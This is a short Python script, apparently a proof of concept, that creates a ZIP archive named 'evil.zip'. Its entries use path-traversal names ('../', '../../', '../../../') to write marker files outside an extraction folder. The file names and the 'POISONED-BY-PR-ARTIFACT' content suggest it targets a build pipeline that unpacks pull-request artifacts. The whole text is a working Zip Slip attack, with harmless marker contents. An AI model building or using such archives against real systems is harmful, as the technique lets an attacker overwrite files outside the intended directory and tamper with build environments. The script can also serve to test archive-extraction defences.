import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../ZIPSLIP-PROOF.txt', 'POISONED-BY-PR-ARTIFACT')
    z.writestr('../../ZIPSLIP-PROOF-2.txt', 'POISONED-LEVEL2')
    z.writestr('../../../ZIPSLIP-PROOF-3.txt', 'POISONED-LEVEL3')
print('zip written')
